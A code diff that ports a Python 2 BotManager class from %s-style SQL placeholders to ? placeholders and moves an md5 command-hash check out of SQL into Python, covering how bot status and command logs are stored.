@@ -6,6 +6,7 @@
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 import warnings, socket, ssl
+import md5
 from datetime import datetime, timedelta
 from dbmanager import DatabaseManager, DBError
 
@@ -25,10 +26,10 @@ class BotManager:
             and creates an initial record if not
         """
         try:
-            results = self.db_mgr.exec_query('select * from bot_status where ip = %s', ip)            
+            results = self.db_mgr.exec_query('select * from bot_status where ip = ?', ip)            
             if len(results) == 0:
                self.db_mgr.exec_cmd('''insert into bot_status (ip,  last_startup_time, last_shutdown_time, last_activity_time)
-                            values (%s, %s, %s, %s)''', ip, None, None, None, commit=True)
+                            values (?, ?, ?, ?)''', ip, None, None, None, commit=True)
         except DBError, e:
             print("Error occurred while querying bot status record exists for host {0}".format(ip))
             raise e
@@ -64,7 +65,7 @@ class BotManager:
     def handle_port_update(self, ip, port):
         """ Updates the port of the server sending from the specified ip""" 
         try:
-            self.db_mgr.exec_cmd('update bot_status set port = %s where ip = %s', port, ip)
+            self.db_mgr.exec_cmd('update bot_status set port = ? where ip = ?', port, ip)
         except DBError, e:
             print("Error occurring updating the port of bot {0} to {1}".format(ip, port))
             raise e
@@ -72,7 +73,7 @@ class BotManager:
     def handle_message_update(self, ip, message):
         """ Updates the status message of the server sending from the specified ip""" 
         try:
-            self.db_mgr.exec_cmd('update bot_status set message = %s where ip = %s', message, ip)
+            self.db_mgr.exec_cmd('update bot_status set message = ? where ip = ?', message, ip)
         except DBError, e:
             print("Error occurring updating the status message of bot {0} to {1}".format(ip, message))
             raise e
@@ -81,7 +82,7 @@ class BotManager:
         """ Handles a startup notification from a 
             bot at the specified ip address """
         try:
-            self.db_mgr.exec_cmd('''update bot_status set last_startup_time = %s where ip = %s''', 
+            self.db_mgr.exec_cmd('''update bot_status set last_startup_time = ? where ip = ?''', 
                                                     datetime.now().isoformat(), ip, commit=True)
         except DBError, e:
             print("Error occurred handling the startup status of the bot at ip {0}".format(ip)) 
@@ -91,7 +92,7 @@ class BotManager:
         """ Handles a shutdown notification from a 
             bot at the specified ip address """
         try:
-            self.db_mgr.exec_cmd('''update bot_status set last_shutdown_time = %s where ip = %s''', 
+            self.db_mgr.exec_cmd('''update bot_status set last_shutdown_time = ? where ip = ?''', 
                                         datetime.now().isoformat(), ip, commit=True)
         except DBError, e:
             print("Error occurred handling the startup status of the bot at ip {0}".format(ip)) 
@@ -101,7 +102,7 @@ class BotManager:
         """ Handles a ping notification (just an affirmation that the bot is alive)
             from a bot at the specified ip address """
         try:
-            self.db_mgr.exec_cmd('''update bot_status set last_activity_time = %s where ip = %s''', 
+            self.db_mgr.exec_cmd('''update bot_status set last_activity_time = ? where ip = ?''', 
                                     datetime.now().isoformat(), ip, commit=True)
         except DBError, e:
             print("Error occurred handling the startup status of the bot at ip {0}".format(ip)) 
@@ -111,7 +112,7 @@ class BotManager:
         """ Handles a notification of activity 
             from a bot at the specified ip address"""
         try:
-            self.db_mgr.exec_cmd('''update bot_status set last_activity_time = %s where ip = %s''', 
+            self.db_mgr.exec_cmd('''update bot_status set last_activity_time = ? where ip = ?''', 
                                                 datetime.now().isoformat(), ip, commit=True)
         except DBError, e:
             print("Error occurred handling the startup status of the bot at ip {0}".format(ip)) 
@@ -126,7 +127,7 @@ class BotManager:
         """
         oldest_date = datetime.now() - timedelta(days=days)
         try:
-            self.db_mgr.exec_cmd('delete from bot_status where last_activity_time < %s', oldest_date, commit=True)
+            self.db_mgr.exec_cmd('delete from bot_status where last_activity_time < ?', oldest_date, commit=True)
         except DBError, e:
             print('Error occurred while clearing the bot history ' + 
                   'with oldest allowable date of {0}'.format(oldest_date))
@@ -137,10 +138,10 @@ class BotManager:
         """ Registers a command in the database by storing a 
             log of the command body and the ip addresses of the target servers"""
         try:
-            command_id = self.db_mgr.exec_cmd('insert into command_log (time, content) VALUES (%s, %s) returning command_id', 
-                                      datetime.now().isoformat(), command_text, lastrow=True, commit=True)
+            command_id = self.db_mgr.exec_cmd('insert into command_log (time, content) VALUES (?, ?)',
+                                      datetime.now().isoformat(), command_text, commit=True, lastrowid=True)
             for ip in bot_ips:
-                self.db_mgr.exec_cmd('insert into command_map (command_id, bot_ip) VALUES (%s, %s)',
+                self.db_mgr.exec_cmd('insert into command_map (command_id, bot_ip) VALUES (?, ?)',
                                      command_id, ip, commit=True)
         except DBError, e:
             print('Error occurred while registering ' + 
@@ -153,13 +154,13 @@ class BotManager:
             which are responding to commands as tuples (ip, port)
         """
         try:
-            rows = self.db_mgr.exec_query('select max(time) from command_log having count(time) > 0') 
+            rows = self.db_mgr.exec_query('select max(time) from command_log') 
             if len(rows) == 0:
                 warnings.warn('Did not find any commands in the command_log!', RuntimeWarning)
                 return []
             last_cmd_time = rows[0][0]
             active_bots = self.db_mgr.exec_query('select ip, port from bot_status where ' + 
-                                                '(last_activity_time > %s or last_startup_time > %s) '
+                                                '(last_activity_time > ? or last_startup_time > ?) '
                                                 'and port > 0', last_cmd_time, last_cmd_time)
         except DBError, e:
             print('Error occurred while obtaining IP addresses of active bots')
@@ -179,12 +180,12 @@ class BotManager:
             commands sent in the last 10 seconds """
         try:
             time_window = datetime.now() - timedelta(seconds=10)
-            rows = self.db_mgr.exec_query('select * from command_log where md5(content) = %s and time > %s',
-                                          cmdhash, time_window)
+            rows = self.db_mgr.exec_query('select content from command_log where time > ?', time_window)
+            matching_content = [1 for r in rows if md5.new(r[0]).hexdigest() == cmdhash]
         except DBError, e:
             print("Error occurred while validating the command {0}".format(cmdhash))
             raise e
-        return len(rows) >= 1
+        return len(matching_content) >= 1
 
     def send_to_all(self, content):
         """ Connects to all bots and sends the specified content
